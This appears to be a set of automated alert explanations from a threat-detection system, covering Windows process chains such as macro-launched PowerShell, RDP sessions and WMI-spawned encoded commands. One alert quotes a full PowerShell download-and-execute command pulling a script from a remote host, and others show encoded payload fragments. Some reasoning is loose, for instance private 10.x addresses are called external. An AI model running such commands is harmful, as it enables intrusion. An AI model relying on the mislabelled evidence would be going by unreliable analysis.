explanation:
Attack: A new process, rdpclip.exe, was launched with sysadmin privileges, indicating potential remote access or credential theft.
Why this event: The launch of rdpclip.exe is new for this machine and is associated with a remote logon by sysadmin, which is not a normal administrative activity.
Chain: svchost.exe -> rdpclip.exe (new process launched)
Evidence: svchost.exe connected to multiple external IPs (10.20.5.191, 10.50.2.101) and accepted a network logon from 10.103.123.250:54756 at 13:47:20, followed by rdpclip.exe execution.

Attack: A new process gpscript.exe was executed with sysadmin privileges, indicating potential malicious activity.
Why this event: The execution of a new process with sysadmin privileges is suspicious, especially given the context of recent suspicious activity.
Chain: svchost.exe -> gpscript.exe /RefreshSystemParam
Evidence: At 13:48:21, gpscript.exe was launched by svchost.exe with the command line /RefreshSystemParam. This follows several suspicious activities, including svchost.exe launching cmd.exe with "C:\ncr\murder_onedrive.bat" and "C:\ncr\enable_test_signing.bat". A remote logon by sysadmin (domain SYSTEMIA.COM) occurred at 13:47:20.

Attack: A Remote Desktop session initiated by an external IP connected to an internal host, followed by an outbound connection to a potentially malicious internal IP.
Why this event: The activity involves an external RDP connection followed by an outbound connection to an internal IP on port 3389, which deviates from normal administrative activity.
Chain: explorer.exe -> mstsc.exe -> mstsc.exe connected to 10.47.35.74:3389
Evidence: Remote Desktop logon by sysadmin (domain SYSTEMIA.COM) from 10.103.123.250 at 13:47:20; mstsc.exe started at 13:54:16; mstsc.exe connected to 10.47.35.74:3389 at 13:54:36.

Attack: A malicious script was downloaded and executed via a Word document macro.
Why this event: The execution of a command prompt spawning PowerShell with a downloaded, encoded script indicates a post-exploitation activity.
Chain: outlook.exe -> winword.exe -> cmd.exe -> powershell.exe
Evidence: winword.exe started cmd.exe with command line C:\Windows\System32\cmd.exe /k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://news.com:8000/default.ps1');powershell -noP -sta -w 1 -enc $e.

Attack: Remote PowerShell execution initiated via a downloaded script and subsequent outbound connection to an external IP.
Why this event: The process started with a command to download and execute a script from a web source, followed by establishing an outbound connection, which is indicative of malware execution.
Chain: cmd.exe -> powershell.exe (started with download command) -> powershell.exe (ran New-Object, wrote script, connected to external IP).
Evidence: powershell.exe started at 10:39:40 with command to download from http://news.com... at 10:39:48, and subsequently connected to 132.197.158.98:8000.

Attack: Remote execution via encoded PowerShell command initiated by a suspicious process.
Why this event: The process launched with a base64 encoded command and immediately attempted network connections and system enumeration, indicating malicious activity.
Chain: cmd.exe -> powershell.exe (rsantilli) -> powershell.exe (rsantilli)
Evidence: powershell.exe started with -enc SQBmACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEA… which decodes to a command downloading content from http://news.com..., and subsequently ran commands like Get-WmiObject and Compare-Object.

Attack: Remote execution of a base64 encoded PowerShell command via WMI.
Why this event: The execution of a newly spawned PowerShell process with an encoded command, initiated by wmiprvse.exe, is highly suspicious.
Chain: wmiprvse.exe -> powershell.exe (executed with -enc parameter).
Evidence: At 14:44:54, powershell.exe was launched by wmiprvse.exe with the command line: C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMA… The decoded command attempts to retrieve cached Group Policy settings. Subsequently, powershell.exe started conhost.exe at 14:44:55.

Attack: Suspicious encoded PowerShell execution initiated by wmiprvse.exe.
Why this event: The execution of PowerShell with an encoded command string is highly suspicious, especially when initiated by wmiprvse.exe, indicating potential remote execution or persistence.
Chain: wmiprvse.exe -> powershell.exe (started 14:44:54 with command line: C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgB…) -> conhost.exe (started 14:44:55 with command line: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1).
Evidence: The alert triggered on host-d2af at 14:44:55. The process tree shows wmiprvse.exe spawning powershell.exe which then spawned conhost.exe with an encoded command line.
